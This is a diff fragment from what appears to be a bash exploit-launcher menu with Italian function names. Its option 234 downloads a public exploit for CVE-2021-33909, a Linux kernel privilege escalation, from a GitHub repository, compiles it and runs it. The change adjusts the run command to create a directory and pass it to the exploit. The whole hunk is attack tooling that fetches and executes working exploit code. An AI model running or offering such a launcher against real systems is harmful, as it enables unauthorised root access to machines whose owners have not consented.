@@ -1326,7 +1326,7 @@ while true; do
 	;;
 	"234")
 		Scarica "Liang2580/CVE-2021-33909" "$ENTRAW""Liang2580/CVE-2021-33909/main/exploit.c" "sequoia.c"
-		gcc sequoia.c -o sequoia;chmod +x sequoia;./sequoia
+		gcc sequoia.c -o sequoia;chmod +x sequoia;mkdir dir;./sequoia $(pwd)/dir
 	;;
 	*)
 		echo "error, invalid choice"
